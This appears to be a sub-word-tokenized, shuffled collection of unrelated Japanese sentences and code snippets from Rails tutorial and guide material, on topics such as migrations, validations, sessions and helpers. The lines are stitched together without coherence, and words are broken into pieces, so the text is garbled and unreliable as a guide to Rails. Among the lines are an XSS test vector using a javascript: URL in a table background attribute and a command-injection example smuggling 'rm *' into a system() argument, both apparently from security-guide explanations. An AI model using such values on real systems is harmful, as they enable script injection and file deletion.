▁ 今回は ユーザー登録ページ の ため だけ に SSL を導入し ますが 、 これは Web サイト 全体 で 適用 できる ため 、 {0}{1} 第 8 章 {/1}{/0} で 実装 する ログイン 機 構 を セキュア に したり 、 { p 2 } で説明する {3} セッションハイジャック {/3} の 脆弱性 に対して も 多くの 利 点を 生 み 出 します 。
▁resources ▁: photos
▁ これを行うには 、 { p 0} で 行った ように {2} attr _ accessor {/2} を使用して アクセス可能 な 属性 を作成します 。
▁` DateTime ` と同様 、 述 語 ` past ?` と ` future ?` は ` Time ▖ current ` を 起 点 とします 。
▁### ▁config / environments / test ▖ rb
▁encoding : ▁ uni code
▁この テストの 中 心 となる のは 、 フォローしているユーザー と フォロワー の カウント が ページに 表示され 、 それぞれ に 正しい URL が設定され ている ことを確認する ことです 。
▁ プロフィール に ▁[ Unfollow ] ▁ ボタン が表示され 、 フォロワー の カウント が 1 つ 増え た
▁**` ActiveSupport :: Cache :: S trategy :: Local Cache :: Middleware ` **
▁もちろん 、 何 の 助 け も な し に Web アプリケーションを 作 ら なければならない など という ことはありません 。
▁Client ▖ count
▁上の コマンドで コピー される マイグレーション は ▁ _ 1 つ _ ▁ だけ である 点にご注意ください 。
▁` create ` など と同様 、 検証 に パス する かどうか によって 、 新しい レコードが データベースに保存 されていない こと がある かもしれません 。
▁上のコード で の順序 は \ k ode { ’ created _ at ▁DESC ’} と しています ▟\ k ode { D E S C } は ▁SQL で い う ところ の ▁“ desc end ing ” ▁ であり 、 新しい もの から 古 い 順 への 降 順 という ことになります 。
▁ このコード では SQL サブ セレクト が使用されています ▟ ユーザー 1 について すべて を 選択 することは 、 内部 的に は以下のような感じ になります 。
▁(\ ref { sec : planning _ the _ application } でも 説明したとおり 、 クラウド IDE を ご 利用 の 方は 、 この プロジェクト を これまで の 2 つの 章 で作成した プロジェクト と同じ ワークスペース に 置く ことができます 。
▁ ダイジェスト
▁validates ▁: email , ▁confirmation : ▁true
▁< table ▁background =" javascript : alert (' Hello ') ">
▁ 両方 試 してみる と わ か る と思います が 、 実際に 動作する のは 後者の 方 です
▁\ emph { 課 外 作業 } : ▁Rails の表示 では 「 非 \ href { http :// es ▖ w ikipedia ▖ org / wiki / ASCII } { ASCII } 文字 」 も サポート されています ▟ ス ペ イン 語 特有の 逆 さ 感 嘆 符 「 ¡ 」 を含む 「 ¡ H ol a , ▁ mundo !」 を表示し てみましょう ▁( 図 \ ref { fig : hola _ mundo })
▁NOTE : ▁ 設定 した キュー 名を キュー イン グ バックエンド が 「 リ ッ ス ン する 」 ようにしてください 。
▁ 演習 の 解 答
▁GitHub と Bitbucket は 、 現 時点 での Git リポジトリ の 2 大 人 気 サイト です 。
▁Rails コ ン ト リ ビュー タ
▁` bundle ▁install ` を実行して Spring をインストール する
▁たとえば 、( 実は 本書 の 第 1 版 や 第 2 版 でも 間 違 って いた のですが ) ▁\ href { https :// github ▖ com / rails / rails / blo b / master / active model / lib / active _ model / secure _ password ▖ rb } { has _ secure _ password } の \ k ode { ソースコード } でも この 手 の 間 違い があります 。
▁# ▁=> ▁[" 以下の 文字 を含む ことはできません ▁ !
▁ 設計 上 、 bcrypt ア ル ゴ リ ズ ム では ハッシュ化 する 前に \ href { https :// en ▖ w ikipedia ▖ org / wiki / S alt _ ( crypt o gr a ph y )} { ソ ル ト } を追加 しています ▟ これにより 、\ href { https :// en ▖ w ikipedia ▖ org / wiki / D ic tion ary _ a tt ac k } { 辞書 攻 撃 ▁( D ic tion ary ▁A tt ac k s )} ▁ や \ href { https :// en ▖ w ikipedia ▖ org / wiki / R a in bo w _ table } { レ イン ボ ー テーブル 攻 撃 ▁( R a in bo w ▁Table ▁A tt ac k s )} ▁ といった タイプ の 攻 撃 を防ぐ ことができます 。
▁ 実は 、 以下のような 新しい ハッシュ 記 法 を使用すると 、
▁` stringify _ keys ` メソッドは 、 レシーバの ハッシュ キーを 文字列に変換 した ハッシュ を返します 。
▁- ▁[ Apache ]( https :// t n 123 ▖ org / mod _ x send file / )
▁それでは マイグレーション を実行し ましょう 。
▁ これが うまく い く のは 、\ k ode { change } メソッドは \ k ode { drop _ table } が \ k ode { create _ table } の 逆 であること を 知 っている からです ▟ つまり 、 ロールバック 用の 逆 方 向 マイグレーション を簡単に 導 く ことができる のです 。
▁" It ▁work ed !"
▁ { c : ▁3 , ▁b : ▁2, ▁a : ▁1 } ▖ to _ query ▁# ▁=> ▁" a = 1 & b = 2 & c = 3 "
▁この To y アプリケーションは もちろん 動 きます が 完成 品 ではなく 、 しかも 多くの 手順 が 「 魔 法 」 のように 思える かもしれません ▟ 第 \ ref { cha : static _ pages } 章 以降 で 作成する サンプルアプリケーション では 同等の 機能を 1 つ 1 つ 手動で 作成します ので 、 ご 安 心 ください 。
▁+ - --- +-------------+ - ------+-------+ --------------- +
▁" John ▁S m i th "▖ parameterize ▁# ▁=> ▁" j o h n - s m i th "
▁ ビューで ` field _ error _ proc ` にアクセス できます 。
▁ 残念ながら 、 このままでは ユーザーの 作成 をそのまま テスト に含め ると 遅 く なってしまい ます ▟ 幸 い な ことに 、 この問題 は 簡単に 回 避 できます 。
▁次に 、 データベースをリセットし て 、 サンプルデータを 再度 生成 します 。
▁この 行 に対応する URL 、 アクション 、 名前付きルート は 表 \ ref { table : RESTful _ users } のようになります
▁D O C TYPE ▁ html >
▁また 、\ emph { RailsSpace } ▁ と ▁\ emph { Rails ▁ チュートリアル } の両方 の 編集 を 担 当 して 頂 いた ▁De b ra ▁Wi ll ia m s ▁C a ul e y ▁ 氏 にも 謝 意 を表し た く 思い ます ▟ 彼女 が 野球 の 試 合 に 連 れ て 行 っ てくれる 限り 、 私 は 本 を 書き 続ける でしょう 。
▁render ▁ body : ▁" raw "
▁ この動作 は ` config ▖ action _ dispatch ▖ x _ send file _ header ` で 設定 可能です 。
▁<%= ▁ auto _ discover y _ link _ tag (: rs s , ▁ { action : ▁" feed " },
▁このメソッド では HTML ス キ ャ ナ と HTML ト ー ク ナ イ ザ ▁( token ize r ) ▁ を使用し ており 、 HTML の 解 析 能 力 は ス キ ャ ナ の 能 力 に依存し ています 。
▁def ▁self ▖ author _ class
▁### ▁ FormTagHelper
▁" Home "
▁create ▁app / assets / stylesheets / microposts ▖ css ▖ scss
▁has _ many ▁: read ing s
▁{0} クラス 2▖1 6 {/0} ▁╼╼{1} \ k ode { Microposts Controller } クラスにおける継承 {3} {/3} ▁ { 4 } app / controllers / microposts _ controller ▖ rb {/4} {/1}
▁ サードパーティ の プラグイン や gem など
▁ レイアウト を構成する
▁class _ attribute ▁: default _ params
▁以下の すべて において 、` INNER ▁JOIN ` を使用した 結合 クエリ が 期待どおり に 生成 されています 。
▁ ユーザー一覧ページ に 削除 用 リンク が表示される
▁ ルーティング は 、 ネスト させ て 使う ことができる
▁Ruby では オブジェクトを 継 承 できる
▁system (" / bin / echo "," hello ; ▁ rm ▁* ")
▁ 上で 追加 した コード では 、` link _ to ` メソッド の使い方 が これまで と 違 って いることにご注目ください 。
▁たとえば 、 エ キ ス パ ート ユーザー には 、 通常 ユーザー と 異なる 画面 を表示し たい とします 。
▁Rails には 、 この種の 技 法 を Web ページ 作成 で使用する ための サポート が 多数 ビルトイン されています 。
▁この節では 、 モックアップ で示した ように フォロー / フォロー解除 の 基本的な インターフェイス を 実装します 。
▁上のコードは 、` another ` という名前の テンプレート を ` app / views / notification s ` ディレクトリ 以下 から 探 索 します 。
▁\ k ode { create } アクション で 保存 が 行われた 後 の動作 をテストする 。
▁=> ▁[ 17 , ▁ 8, ▁42 ]
▁JavaScript に 精 通 している 方 のために 補 足 すると 、 この 機能 は 組み込み クラスの プロ ト タイプ オブジェクト を使用して クラスを 拡張 すること と似ています
▁ モデル や リレーション で の存在 チェック には ` any ?` や ` many ?` も使用できます 。
▁ SCSS を使用して サイドバー などの ユーザー表示ページ に スタイル を与える
▁` New s ` レイアウト を サブ テンプレート 化 する つ も り がない のであれば 、` content _ for ?( : new s _ content ) ▁? ▁yield (: new s _ content ) ▁: ▁yield ` を 単 に ` yield ` に置き換え れば 済み ます 。
▁ _ 悪意のある 入力 を フィルタ すること が きわめて 重要です ▟ Web アプリケーションの 出力 を エスケープ すること も同様に 重要です _ 。
▁% w (▖ js ▁ ▖ css )▖ include ?(
▁ さまざまな 用 途 に合わせて デフォルト 設定 を変更 できます ▟ たとえば 以下のように デフォルトの タグ に table タグ を追加する とします 。
▁これで 、 ユーザーが ▁( ` / articles ` ではなく ) ▁ エンジンの ルート パス に 移動 すると 記事 の 一覧 が表示される ようになりました 。
▁number _ with _ precision ( 111▖2345 , ▁2 ) ▁# ▁=> ▁111▖23
▁# ▁ 指定された 日付 ▁( ここでは 本 日 から 6 日 後 ) ▁ を デフォルト値 と する 日付 セレクト ボックス を生成する
▁ この時点で 、 ブラウザで 実際に サインイン できる ことを確認 し 、 続いて ブラウザを閉じ て から 再度 サンプルアプリケーション を表示する と サインイン した まま になっている ことを確認してください 。
▁\ k ode { gravatar _ for } メソッドが 未 定義 の ため 、 ユーザー 表示 ビュー は 現在 動作 していません 。
▁この ヘルパー のデフォルトの エラーメッセージ は ▁_" is ▁not ▁included ▁in ▁the ▁list " _ ▁ です 。
▁この 項 では 、 プロフィール画面 で表示される マイクロポスト に対して 、 統合テスト を 書いていきます 。
▁この バリデーション は Web アプリケーション 特有の もの なので 、 ' acceptance ' は データベースに保存 する必要はありません ▟ 保存 用の フィールド を作成し なかった場合 、 ヘルパーは 単 に 仮 想 の 属性 を作成します 。
▁* ▁` association ( force _ reload ▁= ▁false ) `
▁-------------- ----------------
▁Header ▁un set ▁ ETag
▁### ▁ ネストした レイアウト を使用する
▁| ▁| ▁4 16 ▁| ▁: request ed _ range _ not _ satisf i able ▁|
▁ そ の中から 、 新規 アプリケーション 作成 用の ジェネレータ を使って みましょう ▟ これを 実行 すれば Rails アプリケーションの 基本的な 部分 が 提供され るので 、 開発者 が 自分で これら を作成する 必要はありません 。
▁class ▁B ▁< ▁A ; ▁end
▁ 置き換え る 文字列 は 以下 を使用します 。
▁` i nclusion ` ヘルパー には `: in ` オプション があり 、 受け付け 可能 と する 値 の 集合 を指定します 。
▁Rails 開発 を や っ ていれば 、 一度 は ▁" C an ▁only ▁render ▁or ▁redirect ▁once ▁per ▁action " ▁ エラー に 遭遇 した こと がある でしょう 。
▁Rails では 上の ように 書く だけで 、「 フォームの \ k ode { action } は / users という URL への \ text tt { POST } である 」 と 自動的に 判 定 します が 、 セッション の場合は リソース の \ emph { 名前 } と それに対応する URL を 具体的に 指定 する必要があります
▁ インデックス に - 1 という 値を 指定 できる のは 極めて 便利です ▟ - 1 を使用すると 、 配列 の長さ を \ emph { 知 ら なくても } 配列 の 最後の 要素 を指定する ことができ 、 これにより 配列 を 特定の 開 始 位 置 の 要素 から 最後の 要素 まで を 一度 に 選択 することができます 。
▁ これまで 、 Sessions コントローラのアクション は RESTful ルール に従って いました ▟\ k ode { new } で ログイン ページ を表示し 、\ k ode { create } で ログイン を 完了 する といった 具 合 です 。
▁### ▁ 双 方 向 関連付け
▁* ▁ すべての 拡張機能 を 読み込む 方法
▁ ホームページ の フィード 表示 をテストする 。
▁この ドメイン 特 化 言語 の 文法 は シ ン プ ル で 、 必要な オブジェクトの 属性 を定義する ために Ruby の ブロック と カスタム メソッド を使用しています 。
▁class ▁My sql A d a p ter ▁< ▁ Abstract A d a p ter
▁RSpec の \ text tt { let } メソッドを使用すると 、 テスト 内で 簡単に ローカル変数 を作成する ことができます 。
▁ 実際 、 Bootstrap フレームワーク では 、 多くの 色 に対して 変数 名を 定義 しています ▟ 定義されている 変数 は Bootstrap ページの 「\ href { http :// get bootstrap ▖ com / custom ize / # less - variable s } { LESS 変数 一覧 }」 で 参 照 することができます 。
▁ ボタン に ユーザー登録ページ へのリンク を追加する
▁self ▖ lock ing _ column ▁= ▁: lock _ client _ column
▁さらに 、 どちらの 例 も \ k ode { page } 変数 を参照 しています 。
▁ この種の コード では 、\ k ode { signed _ in ?} ▁ 論理値 が必要 になります ので 、 これ から 定義 しましょう 。
▁ ワーム 作 者 は 、 ユーザーが 追加される 直前に ページに 送信された GET リクエスト の 結果を 解 析 して CSRF トークン を 得 ていました 。
▁ ディレクティブ は 記載 した 順に 実行されます が 、` require _ tree ` で インクルード される ファイルの 読み込み 順序 は 指定 できません 。
▁| ▁PATCH / PUT ▁| ▁ / photos / : id ▁| ▁images # update ▁| ▁ photo _ path (: id ) ▁|
▁`@ import ▁" * " ` や `@ import ▁" ** /* " ` など のように ワ イ ル ド カ ー ド マッチ で ツリー 全体 を指定することもできます ▟ これは ` require _ tree ` と 同等です 。
▁format ▖ atom
▁### ▁` truncate `
▁def ▁show
▁ 注意 : ` secret _ key _ base ` を設定する のは 、 Rails ▁4 ▖ x への ユーザー ベースの 移 行 が 1 00 % 完了 し 、 Rails ▁3 ▖ x に ロールバック する必要が 完全に なく な って から に してください 。
▁` belongs _ to ` 関連付け では 以下の オプション が サポート されています 。
▁ここでは \ k ode { README ▖ rdoc } ファイル の名前 を \ k ode { README ▖ md } に変更し 、 チュートリアル 中に コンテンツ を追加 できるように しておきましょう 。
▁def ▁destroy
▁ 特に 、 cookies を 永 続 化 すると \ href { http :// en ▖ w ikipedia ▖ org / wiki / Session _ hijack ing } { セッションハイジャック } という 攻 撃 を受け る可能性があります ▟ この 攻 撃 は 、 記憶トークン を 奪 って 、 特定の ユーザー になり す ま して ログイン する という ものです 。
▁1▖ me g a by te ▁# ▁=> ▁10 48 57 6
▁config ▖ middleware ▖ insert _ after ▁ActiveRecord :: Query Cache , ▁ Lifo :: Cache , ▁page _ cache : ▁false
▁date ▖ advance ( months : ▁2, ▁day s : ▁- 2 ) ▁# ▁=> ▁We d , ▁ 04 ▁A ug ▁2010
▁ テスト 中に そのユーザー として 自動 ログイン するために 、 そのユーザー の 有効な パスワード も 用 意 して 、 Sessions コントローラの \ k ode { create } アクションに 送信された パスワード と 比 較 できるように する必要があります 。
▁ここでは Ruby における 慣習 として 、 ハッシュの 最 初 と 最後に 空白 を追加 しています ▟ この 空白 は あって も なくても よく 、 コンソール では 無視 されます
▁最後に 、 {0}{1} 第 10 章 {/1}{/0} で メールアドレス を使って アカウントを有効化する 方法 と 、 パスワードを リ セット する方法 について 学びます 。
▁* ▁`: location ` ▁- ▁ sendmail 実行 ファイルの 場所 。
▁ 現在の 設計 では 、 攻撃者が 仮 に 両方 の cookies を 奪 い 取ること に 成功 した としても 、 本 物 の ユーザーが ログアウト すると ログイン できない ようになっています 。
▁\ ref { sec : signup _ error _ messages } では 、 この 要求 を 新しい ユーザーを 作る ための ユーザー登録フォーム に まで 徹 底 させる 方法を 確認し ます 。
▁ Y o el ▁A d ler の 指 摘 によって 、 この問題 と 解決策 が 見 つ か りました ▟ 感 謝 いた します 。
▁このオプション はデフォルトで は 無効 です ▟ サーバー が この ヘッダー をサポートしてい れば オン に できます 。
▁ ご 覧 のとおり 、\ k ode { rails } コマンド を実行すると 大量の ファイル と ディレクトリ が 作成されます 。
▁ 条件 は 、 文字列 、 配列 、 ハッシュ のいずれか の 方法で 与 え ることができます 。
▁ 先ほど の 3 つの 条件 を アサーション に変換 して 、 User モデル ▁( リスト { p 0} ) ▁ {2} feed {/2} メソッド がある ことに 注意 しながら 、 更新 した User モデル に対するテスト を書いて みましょう ▟ 結果を リスト \ ref { code : full _ feed _ test } に示します 。
▁ 引数に は 、 曜 日 を表す 正しい シンボル を 渡します ( `: monday ` など ) 。
▁次に master ブランチにマージ して 、 リモート にある リポジトリ に対して push します 。
▁ここで ` db / migrate / 20 140 1 20 19 17 2 9 _ create _ articles ▖ rb ` ▁ ファイルを エディタ で 開 い てみると ▁( タイムスタンプ は 各 自 異なる ことにご注意ください ) 、 以下の ようになっています 。
▁email = michael %40 michael hartl ▖ com ╼╼ This ▁link ▁will ▁ expire ▁in ▁two ▁hours ▖
▁X - Runtime : ▁0▖0 8 34 9 6
▁これ を利用する には 、 アプリケーションの development 環境 の設定 に 手 を加える 必要があります ▁( リスト \ ref { code : development _ email _ settings }) 。
▁self を省略した 結果を リスト \ ref { code : log _ out _ with _ forget } に示します 。
▁\ ref { sec : requiring _ logged _ in _ users } で 経験 し てきた ように 、 Users コントローラ をテストするために 、 アクション 単 位 で アクセス制御 をテストします 。
▁# ▁ 関連付け 経 由
▁この 変更 を行わ なかった場合 、 アプリケーションは development 環境で も production 環境 と同じ ` / assets ` から プリコンパイル した アセット を提供します ▟ この場合 、 アセット を再 コンパイル しない と ローカル での 変更 が 反映され ません 。
▁\ k ode {@ microposts } インスタンス変数 を \ k ode { show } アクション に追加する
▁message : ▁" % { value } は 予 約 済み です "
▁ これはリスト \ ref { code : following _ followers _ action s _ routes } で定義した 2 つの ルーティング にも と づ い ており 、 これらは それぞれ \ k ode { following } および \ k ode { followers } と呼ぶ 必要があります 。
▁ 幸 い 、 Action ▁Mailer には すべての メールの 配信 前に 処理 を加える ための フック が 提供され ています 。
▁リスト \ ref { code : email _ format _ validation _ tests } と同様に 、 リスト \ ref { code : email _ format _ validation _ tests } でも エラーメッセージ を カスタマイズ して 、 どの メールアドレス で 失敗した のか すぐに 特定 できるように しておきます ▟ ▁includes ▁a ▁custom ▁error ▁message ▁to ▁identify ▁the ▁exact ▁address ▁caus ing ▁any ▁failure ▖
▁ 本ガイド で 説明 のために 作成する エンジン には 、 記事 と コメント の 送信 機能 があります ▟ 基本的に は [ Rails を はじめ よう ]( getting _ started ▖ html ) と よく 似 た スレッド に従い ますが 、 多少 の 新 味 も 加 えられ ています 。
▁ このように 、\ k ode { nil } オブジェクト 自身 は \ k ode { empty ?} メソッド には 応答 しない にもかかわらず 、\ k ode { nil ▖ to _ s } と すると 応答 する ことがわかります 。
▁Client ▖ order (" created _ at ▁ASC ")
▁従って 、 この場合 ` nil ` に対する 動作 は 異 なり 、 上で 説明 されている ` K ernel # Array ` についても この 異なる 動作 が 残 り の ` object ` に 適用 されます 。
▁( ここでは { p 0} の 途中 で紹介した {2} touch {/2} コマンド を使っています が 、 ファイルが 作成 できる なら ▁[ 新規 ファイル 作成 ] ▁ や 他の コマンド でも 問題ありません ▟)
▁self を省略した 結果を リスト \ ref { code : users _ controller _ test _ signup _ route } に示します 。
▁validate ▁: expiration _ date _ cannot _ be _ in _ the _ past ,
▁ パスワード再設定の プレビュー メソッド ▁( 動作 可能 )
▁f ▁ shuffle ╼ > > ▁self ▖ ?( '') ▖ ? ▖ ? ╼ > > ▁end ╼ > > ▁end ╼ > > ▁" foobar "▖ shuffle ╼ => ▁" bo ra fo " ╼\ end { code }╼\ end { code listing } ╼ ▁% ▁subsection ▁modify ing _ built _ in _ classes ▁( end )╼╼ ▁\ subsection { コントローラ クラス } ▁% ▁( fold )╼ ▁\ label { sec : a _ controller _ class }╼╼
▁このコードは リスト \ ref { code : authenticated _ p _ fixed } で使用されていました ▟ もうひとつ 、
▁また 、 空の パスワードを 入力 させ ない ために 、\ k ode { 存在性 } のバリデーション ▁(\ ref { sec : presence _ validation }) ▁ も一緒に 追加します ▟ 結果 として 、 User モデル のコードは リスト \ ref { code : password _ implementation } のようになります 。
▁ フォーム 送信 をテストするために は 、 ▁\ text tt { users \_ path } に対して \ k ode { POST } リクエストを送信する 必要があります ▁( 表 \ ref { table : RESTful _ users })▟ これは 、 次のように \ text tt { post } 関数 を使って 実現 できます
▁ スタイルシート 内に 共通の パターン がある場合 は 、 要素を ネスト させる ことができます 。
▁ 最も 簡単な 方法は 、 Rake の \ k ode { db : reset } タスク を実行して データベース を リ セット することです 。
▁このコードは モデル 内にある ので \ k ode { self } は 省略 できます ▟ 最終的に Ruby ら しく 書かれた コードは 次のようになります 。
▁この場合 、 それぞれの \ k ode { div } には CSS クラス が与えられ ています 。
▁これにより 、 エンジンの ルーティング が エンジン 自身 に 制限 され 、[ test ディレクトリ ](# test ディレクトリ ) セクション で 説明したように 特定の 位 置 に マウント できるようになります 。
▁ エラーメッセージ に スタイル を与える ための CSS
▁# ▁config ▖ force _ ssl ▁= ▁true
▁リスト \ ref { code : relationships _ controller _ following } を見 て み れば 、 先ほど の セキュリティ 問題 が 実は それ ほど 重大な もの ではない ことを 理解 いた だけ る と思います ▟ もし ログイン していない ユーザーが ▁(\ k ode { curl } などの コマンドライン ツール など を使用して ) ▁これらの アクションに 直接 アクセス する ようなことがあ れば 、\ k ode { current \_ user } は \ k ode { nil } になり 、 どちらの メソッド でも 2 行目 で 例外が発生します ▟ エラー には なります が 、 アプリケーション や データ に 影 響 は 生 じ ません 。
▁ デモアプリケーション 用の \ k ode { Gemfile } 。
▁ { nil ▁=> ▁nil , ▁1 ▁=> ▁1, ▁nested : ▁ { a : ▁3 , ▁5 ▁=> ▁ 5}} ▖ deep _ stringify _ keys
▁ 語 調
▁assemblies ▖ create ( attributes ▁= ▁{})
▁ ど れ ほど 十分 に 気 を付け ていた としても 、 Rails アプリケーションの 開発 中に 何か 失敗 してしまう ことは あり えます 。
▁\ href { https :// help ▖ ubuntu ▖ com / community / ImageMagick } { U b un t u の 公式 ドキュメント } ▁( 英語 ) ▁ で これ を見つけ ました 。
▁上の 文 は以下のように 書く こともできます 。
▁ か と い って 、 K eep - A li ve が 無効 になっている ことを 当 て にする わ け には い き ません 。
▁ jQuery ライブラリ には DOM 操作 用の 膨大な メソッドが 提供され ています が 、 ここで 使用する のは わずか 2 つ です 。
▁ ブラウザ や フィード リ ー ダ ー が 検出 可能な RSS フィード や Atom フィード のリンク タグを返します 。
▁{0} 図 11 ▖ 5 {/0} ▁{1} マイクロポスト 用の コードの ある ユーザー プロフィール ページ ▁( ただし マイクロポスト がない ) {/1}
▁\ href { http :// sqlite browser ▖ org /}{ D B ▁B row s er ▁for ▁SQLite } で作成した \ k ode { users } テーブル を確認する
▁#### ▁ メイラー を編集する
▁create ▁app / mailers / application _ mailer ▖ rb
▁* ▁his または her s ▁-> ▁their s に置き換える
▁ このように テスト することで 、 バリデーション のテスト が 失敗した とき 、 バリデーション の実装 に 問題 が あった のか 、 オブジェクト そのもの に 問題 が あった のか を確認する ことができます 。
▁` inquiry ` は 、 文字列を ` String In q u ir er ` オブジェクト に変換 します ▟ この オブジェクト を使用すると 、 等 しい かどうかを より ス マ ート に チェック できます 。
▁\ k ode { name } と \ k ode { email } 属性を アクセス可能 にする 。
▁=> ▁[ 0, ▁1, ▁2, ▁3 , ▁4 , ▁5 , ▁6 , ▁7 , ▁ 8, ▁ 9 ]
▁上の 特 殊 タグ 以外に も 、`: class ` や `: id ` や `: name ` などの 標準的な HTML オプションを 最終的に ハッシュ に したものを 引数として 与 え ることができます 。
▁\ ref { sec : a _ proto _ feed } の プロ ト フィード では 、 上のような 選択 を行う ために Active ▁Record で リスト { p 2 } のように {3} where {/3} メソッドを使用して いた ことを思い出してください 。
▁# ▁POST ▁ / users
▁ 現在の 状態 を 確認し てみましょう 。
▁ 認 証 のために まったく 新しい モジュール を 作る ことも 可能です が 、 Sessions コントローラに は既に \ k ode { Sessions Helper } という モジュール が 備わっています 。
▁ en code d _ content ▁= ▁S pe cial E n code ( File ▖ read (' / path / to / filename ▖ jpg ') )
▁### ▁Gemfile
▁ 試 作 フィード がある Home ページのモックアップ
▁invoke ▁ js
▁ パスワード 再設定 で使用する 属性 を追加した User モデル
▁ 今後 Rails アプリケーション の中で よく 分 から ない 挙 動 が あった ら 、 上の ように \ k ode { debugger } を 差 し 込 んで 調 べ てみましょう ▟ ト ラ ブ ル が 起こ って い そう な コードの 近 く に 差 し 込 む のが コ ツ です 。
▁g ▖ test _ framework ▁: test _ unit
▁ すべての テストを実行 するには 以下のように します 。
▁: prev ent _ delivery _ to _ guest s ,
▁ここでは ひ と まず マイクロポストを 1 つ か 2 つ 作成し 、 少なくとも 片 方 の \ k ode { user \_ id } が \ k ode {1} になるように して 、\ ref { sec : a _ user _ tour } で作成した 最初の ユーザーの id と同じ に します 。
▁#### ▁file _ field
▁self を省略した 結果を リスト \ ref { code : initial _ micropost _ spec } に示します 。
▁NOTE : ▁ _ 通常の Web アプリケーション 開発 上で 必要となる セキュリティ上の 注意 と同様 の 注意 が Ajax に対して も 必要です 。
▁@ assembly _ count ▁= ▁@ part ▖ assemblies ▖ size
▁ 他の マニフェスト や 、 個 別の スタイルシート / JavaScript ファイルを インクルード したい場合は 、` config / initializers / assets ▖ rb ` の ` precompile ` という 配列 を使用します 。
▁ 本 節 を 続ける 前に 、 一 旦 ここで 、 初期 の 頃 から ▁Rails ▁ フレームワーク に対して 指 摘 されて いた 「 Rails ▁ は ス ケ ー ル できない 」 という 主 張 について 触れ たい と思います ▟ すなわち 、「 Rails ▁ では 大量の トラフィック を 捌 く ╼ ことができ ない 」 という 主 張 です 。
▁### ▁Active ▁Record ▁O b server と Action ▁Controller ▁S w eep er
▁### ▁ コードを書く
▁これは 、` get `、` post ` メソッド など が 作業を 委譲 するときに 使われ る 手法 です 。
▁このとき 、 新たに 関連付けられたオブジェクト について 、 新しい 結合 モデル が 作成されます ▟ 結合 時に 不 足 している 部分 があれば 、 その 行 は 結合 モデル から 削除され 、 結合 モデルに 含 まれ なくなります 。
▁articles ▁GET ▁ / articles (▖ : format ) ▁articles # index
▁### ▁Web サーバーを起動 する
▁validate ▁: active _ customer , ▁on : ▁: create
▁本章では データモデル に対して 変更を 加えて い なかった ので 、\ ref { sec : modeling _ users _ co nclusion } の ステップ が 済 んで い れば 、 本 当 は Heroku 上で マイグレーション を実行し なくても 問題 ない はずです 。
▁ こういった ケース に 対 処 して お か ない と 、\ k ode { POST } や ▁\ k ode { PATCH }、\ k ode { DELETE } リクエストを 期 待 している URL に対して 、( リダイレクト を通して ) ▁\ k ode { GET } リクエストが 送 ら れ てしまい 、 場合によっては エラーが発生し ます 。
▁\ k ode { create } アクションに 空の \ k ode {@ feed \_ items } インスタンス変数 を追加する
▁テストにパスする 必要のある 、 リスト { p 0} の {2} update {/2} アクションは 、 リスト \ ref { code : login _ upon _ signup } に示したように 、 {2} create {/2} アクション ▁( リスト \ ref { code : user _ update _ action }) ▁ の 最終的な フォーム と ほぼ 同じです 。
▁ パーシャル を使用した new ユーザー ビュー 。
▁図 \ ref { fig : user _ model _ password _ digest } のような データモデル に するために 、 まずは \ k ode { password \_ digest } カラム 用の 適切な マイグレーション を生成します 。
▁=> ▁2
▁# ▁gem ▁' debugger ', ▁group : ▁ [: development , ▁: test ]
▁a 1 ▁= ▁A ▖ new
▁リスト { p 0} で ジェネレータ を使用して 作成した {2} new ▖ html ▖ erb {/2} ビュー と異なり 、 この {2} show ▖ html ▖ erb {/2} ファイル は自動的に は 作成 されない ので 、 手動で 作成します ▟ この ファイルを 作成 後 、 リスト \ ref { code : stub _ user _ view } の内容を 貼 り 付け てください 。
▁ ドキュメント は 簡潔 であり 、 かつ 全体 を 理解 できる もの であること 。
▁mail ( to : ▁user ▖ email ,
▁これで 、 少なくとも サインイン の ルート を追加する まで の 間 、 リンク と 名前付きルート が完成しました ( 第 \ ref { cha : log _ in _ log _ out } 章 ) 。
▁この場合 、\ k ode { div } タグ にも CSS クラス ▁(\ k ode { container }) ▁ が与えられ ています 。
▁WARNING : ▁ コントローラ 側 では 、` to _ param ` メソッドが モデル 側 で 再 定義されている 可能性 がある ことに 常に 注意 しておく必要があります ▟ 上のような リクエストを 受 信 した 場合 、` params [: id ]` の 値が " 3 57 - j o h n - s m i th " になる からです 。
▁te }╼╼ ▁% ▁subsection ▁destroying _ microposts ▁( end )╼╼ \ subsection { フィード 画面 における マイクロポストの テスト } ▁% ▁( fold )╼\ label { sec : micropost _ tests }╼╼
▁Article ▖ first ▖ cat eg or ies ▖ any ?
▁config ▖ assets ▖ cache _ store ▁= ▁: memory _ store
▁ 複 合 インデックス の詳細については [ MySQL の マニュアル ]( http :// dev ▖ mysql ▖ com / doc / ref man / 5 ▖ 6 / en / multiple - column - index es ▖ html ) ▁( 英語 ) ▁ を参照してください 。
▁< h 2 > A d d ▁a ▁comment : </ h 2 >
▁Rails の デフォルトでは 、 主キー カラム の名前 に ` id ` が使用されます ▁( なお ` id ` に したい場合は 値 を設定する 必要はありません ) 。
▁* ▁ Pro t ec ted ▁Attributes を使用して いない のであれば 、` white list _ attributes ` や ` mass _ assignment _ sanitizer ` オプション など 、 この gem に関連する すべての オプションを 削除 できます 。
▁ パーシャル を呼び出す ときに 、 一 緒 に 変数 を 渡す ことができる
▁# ▁Use ▁C api str a no ▁for ▁deployment
▁このメソッドは 、 そのような 命 名 慣習 に従って い る 言語 ▁( JavaScript など ) ▁ で使用される 名前 を 求 め る の に 便利です 。
▁1 人のユーザー に 複数の マイクロポスト がある 。
▁Sessions コントローラの \ k ode { create } アクション が 完成 した ところ ▁( まだ 動きません ) 。
▁### ▁` config / secrets ▖ yml `
▁resources ▁: articles ▁do
▁\ ref { sec : signup _ form } の ユーザー登録ページ のときと同様に 、 図 \ ref { fig : login _ mockup } モックアップ を元に セッション 新規 開 始 用の ログインフォーム を作成します 。
▁### ▁ 無名 モジュール
▁最後に 、 本チュートリアル で 使う ことはありません が 、 ユーザー を有効に した ときの 日時 も 念のため に 記 録 しておきます 。
▁ 関連付け ▁( association ) ▁ では 、 外部キー の名前 を 推 測 するときに この メソッドを使用します ▟ たとえば ` has _ one ` と ` has _ many ` では 以下 を行って います 。
▁ 初期化 コードの 置き場所
▁# ▁=> ▁Fri , ▁ 06 ▁A ug ▁2010 ▁17 : 11 : 58 ▁C E ST ▁+ 02 :00
▁Active ▁Job は 、 ジョブ 作成 用の Rails ジェネレータ を提供 しています 。
▁ ちなみに 、\ k ode { private } キーワード 以降 のコードは 、 強 調 の ため \ k ode { create _ remember _ token } の インデント を 1 段 深 く して あります
